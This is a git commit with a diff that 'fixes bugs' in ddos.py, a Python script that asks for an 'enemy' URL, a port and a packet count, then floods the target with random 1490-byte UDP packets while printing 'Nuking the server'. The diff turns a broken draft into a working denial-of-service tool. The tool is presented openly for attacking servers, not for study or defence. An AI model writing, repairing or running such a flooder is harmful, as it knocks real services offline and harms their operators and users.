f2cfe6685990327c6f3a14fe1c37a17f9c19ec9c
mystic-poop <enesyildiz320@icloud.com>
2025-03-31 21:42:43 +0300

    Update ddos.py
    Fixed bugs

--- ddos.py
+++ ddos.py
@@ -1,30 +1,44 @@
 import requests
 import os
 import socket
-import random 
+import random
+from urllib.parse import urlparse
+
 print("""
 **********************
-*     X_X             *
-* Made by Mystic-poop *
-*         Or          *
-*       Xenz          *
-*                     *
-*                     * 
+*     X_X            *
+* Made by Mystic-poop*
+*         Or         *
+*       Xenz         *
+*                    *
 ***********************
- """)
-print("Write your enemy (with http:// or https://)")
-gonnacooked = input()
-print("which port do you want to explode")
-whichport =eval(input())
-print("How much nukes need to send ")
-amountofnukes =eval(input())
+""")
+print("Write your enemy URL (with http:// or https://)")
+url = input()
+parsed_url = urlparse(url)
+gonnacooked = parsed_url.hostname  
+print("Which port do you want to attack?")
+whichport = int(input())  
+print("How many nukes to send?")
+amountofnukes = int(input())  
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 os.system("clear" if os.name == "posix" else "cls")
-while  True:
-    sock.sendto(bytes ,(gonnacooked, whichport))
-    nukes = nukes +1
-    print ("Nuking the server...")
-if nukes > amountofnukes:
-    print("Done!")
-    input("ress Enter to exit")
+
+nukes = 0
+try:
+    ip = socket.gethostbyname(gonnacooked)  
+except socket.gaierror:
+    print("Invalid hostname. Could not resolve IP.")
+    exit()
+
+target = (ip, whichport)
+print(f"Starting attack on {target[0]}:{target[1]}")
+
+while nukes < amountofnukes:
+    sock.sendto(bytes, target)
+    nukes += 1
+    print(f"Nuking the server... Sent: {nukes} By mystic-poop or xenz")
+
+print("Done!")
+input("Press Enter to exit")
